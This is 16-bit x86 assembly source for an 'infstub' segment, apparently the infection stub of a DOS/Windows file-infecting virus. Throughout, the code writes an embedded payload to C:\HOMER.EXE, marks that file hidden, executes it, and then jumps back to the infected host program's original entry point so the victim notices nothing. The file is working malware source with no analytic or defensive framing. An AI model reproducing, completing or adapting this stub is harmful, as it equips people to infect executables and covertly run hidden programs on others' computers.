model large

infstub SEGMENT PRIVATE

.286

ASSUME CS: infstub, DS: infstub, ES: infstub

				org 0h

runcode_start label far
runcode_start_near	label near

				pusha
				push	ds
				push	es

		runcode_doparamblock:			; Makes a call structure for exec

				mov	ax,0ah         	; Create alias descriptor
				mov	bx,cs
				int	31h
				mov	ds,ax

				mov	ah,51h
				int	21h

				mov	[rc_cmdline_seg],bx
				mov	[rc_1fcb_seg],bx
				mov	[rc_2fcb_seg],bx
				mov	es,bx
				mov	ax,es:[2ch]
				mov	[rc_env_seg],ax

		runcode_write:
				mov	ah,3ch				; Create file
				xor	cl,cl
				mov	dx,offset runcode_filename
				int	21h
				jc		runcode_run			; Jump also if already present
				mov	bx,ax
				mov	ah,40h				; Write to file
				mov	cx,[runcode_size]
				mov	dx,offset runcode_end
				int	021h
				mov	ah,3eh				; Close file
				int	021h
				mov	dx,offset runcode_filename
				mov	ax,4301h				; Make file hsra
				mov	cx,22h				; Hidden + Archive
				int	021h
		runcode_run:
				mov	dx,offset runcode_filename
				push	cs
				pop	es
				mov	bx,offset rc_paramblock
				mov	ax,4b00h;
				int	021h					; Runs Homer
		runcode_chain:
				mov	ax,0001h				; Free LDT descriptor
				mov	bx,ds
				int	31h
				pop	es
				pop	ds
				popa
				db		0eah					; Chain old program
		runcode_oldip		dw 	0
		runcode_oldcs		dw 	0ffffh
		runcode_stub_size	dw		runcode_end-runcode_start_near
		runcode_size		dw		0
		runcode_filename	db 'C:\HOMER.EXE',0;
		rc_paramblock		label near
		rc_env_seg			dw ?
		rc_cmdline_off		dw 80h
		rc_cmdline_seg		dw ?
		rc_1fcb_off			dw 5ch
		rc_1fcb_seg			dw ?
		rc_2fcb_off			dw 6ch
		rc_2fcb_seg			dw ?
		runcode_end 		label near

infstub ENDS

PUBLIC	C runcode_start
PUBLIC	C runcode_size
PUBLIC	C runcode_filename
PUBLIC	C runcode_stub_size
PUBLIC	C runcode_oldip

END
